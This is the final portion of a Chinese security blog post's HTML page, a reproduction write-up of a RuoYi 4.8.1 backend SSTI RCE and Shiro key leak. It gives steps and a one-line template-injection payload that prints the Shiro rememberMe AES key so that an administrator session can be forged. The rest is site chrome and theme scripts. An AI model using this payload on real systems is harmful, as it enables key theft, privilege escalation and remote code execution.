+<p>在这就是能够提升后台用户权限，通过 Shiro Key 伪造管理员用户，将普通的后台用户权限，提升到更高的管理员权限用户，在进一步挖掘漏洞。</p>
+<p>为了利用 Shiro 反序列化漏洞，需要获取 AES 密钥。密钥存储在 <code>CookieRememberMeManager</code> 对象中。</p>
+<p><strong>构造步骤：</strong></p>
+<ol>
+<li><strong>入口</strong>：<code>@securityManager</code>。</li>
+<li><strong>获取 Manager</strong>：调用 <code>securityManager.getRememberMeManager()</code>。</li>
+<li><strong>反射读取字段</strong>：通过反射找到 <code>getCipherKey</code> 方法（或直接访问字段，取决于可见性，通常用 getter）。</li>
+<li><strong>编码输出</strong>：利用 Java 的 Base64 工具类对字节数组进行编码，方便显示。</li>
+</ol>
+<p><strong>最终 Payload:</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">__|$$&#123;#response.getWriter().print(@securityManager.getClass().forName(&#x27;java.util.Base64&#x27;).getMethod(&#x27;getEncoder&#x27;).invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))&#125;|__::.x<br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ?scene=1">https://mp.weixin.qq.com/s/4yi0UOTgBCsGK6J8qSz8tQ?scene=1</a></li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/%E8%8B%A5%E4%BE%9D/" class="print-no-link">#若依</a>
+      
+        <a href="/tags/SSTI/" class="print-no-link">#SSTI</a>
+      
+        <a href="/tags/ruoyi/" class="print-no-link">#ruoyi</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>若依4.8.1 后台SSTI注入RCE和泄露ShiroKey漏洞复现</div>
+      <div>http://candyb0x.github.io/2025/12/05/若依4-8-1-后台SSTI注入RCE和泄露ShiroKey漏洞复现/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年12月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/05/React-%E6%A1%86%E6%9E%B6-CVE-2025-55182-CVE-2025-66478-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="React 框架 CVE-2025-55182 CVE-2025-66478 RCE漏洞复现">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">React 框架 CVE-2025-55182 CVE-2025-66478 RCE漏洞复现</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/09/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%90%84%E7%A7%8D%E5%93%88%E5%B8%8C%E5%80%BC%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%88%A9%E7%94%A8/" title="域渗透各种哈希值的作用与利用">
+                        <span class="hidden-mobile">域渗透各种哈希值的作用与利用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
